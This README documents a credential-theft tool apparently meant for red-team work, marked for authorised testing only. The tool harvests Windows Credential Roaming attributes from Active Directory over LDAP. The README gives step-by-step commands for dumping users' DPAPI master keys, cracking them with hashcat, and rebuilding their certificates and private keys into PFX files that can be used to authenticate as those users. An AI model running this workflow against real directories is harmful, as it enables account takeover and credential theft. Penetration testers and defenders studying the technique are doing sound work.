# RoamHunt

Hunt **Windows Credential Roaming** secrets straight from Active Directory.

When Credential Roaming is enabled, a user's DPAPI master keys and PKI
credentials are stored, encrypted, on their AD object in the
`msPKIDPAPIMasterKeys` and `msPKIAccountCredentials` attributes. 
`RoamHunt` reads those attributes over LDAP and turns them into something you can act on.

It acts as a bridge from the raw
`msPKIDPAPIMasterKeys` **LDAP attribute** to a `DPAPImk2john` / hashcat hash,
cross-platform.
Once the password is recovered, `RoamHunt` also rebuilds the roamed certificate and private key from
`msPKIAccountCredentials` into a ready-to-use PFX.

Existing tools (DPAPImk2john, DPAPISnoop, SharpDPAPI, dploot)
all start from a master-key *file* on disk while `RoamHunt` starts from the
directory.

> Technique background: Mandiant, *"They See Me Roaming"* (APT29 credential
> roaming), and `CVE-2022-30170`. For authorised testing only.

## Requirements

Python 3.8+ and the libraries in `requirements.txt`:

```bash
pip install -r requirements.txt
```

```bash
python3 roamhunt.py --help
```

## Subcommands

### `search` - Look for users with Credential Roaming enabled

```bash
python3 roamhunt.py search -H <IP or FQDN> -d corp.local -u <USER> -p <PASSWORD> -o loot/
```

Finds users whose `msPKIDPAPIMasterKeys` is populated, prints their
sAMAccountName + SID, and (with `-o`) dumps the raw attributes per user so they
feed the next two commands.
Supports Kerberos authentication.

### `masterkey` - Carve the DPAPI master key for john/hashcat

```bash
python3 roamhunt.py masterkey -i loot/<USER>.masterkeys
DPAPImk2john.py -mk masterkey.mk -S <USER_SID> -c domain > masterkey_hash.txt
hashcat -m 15310 masterkey_hash.txt rockyou.txt      # fall back to -m 15300 if needed
```

### `creds` - Rebuild certificate + key (PFX / PEM)

Once the password is cracked:

```bash
python3 roamhunt.py creds -mk masterkey.mk -S <USER_SID> -p '<password>' -c loot/<USER>.creds
```

By default writes `<certificate-CN>.pfx`. Use `--format pem` for `<CN>.crt` + `<CN>.key`, or `--format both`; -o <name> overrides the basename. A recovered `clientAuth` certificate lets you authenticate as that user (PKINIT / Schannel).

## Credits

- DPAPI master key cracking: `DPAPImk2john` (John the Ripper) + hashcat.
- DPAPI primitives: [impacket](https://github.com/fortra/impacket).
- Credential roaming research: Mandiant, CQURE / Michael Grafnetter.
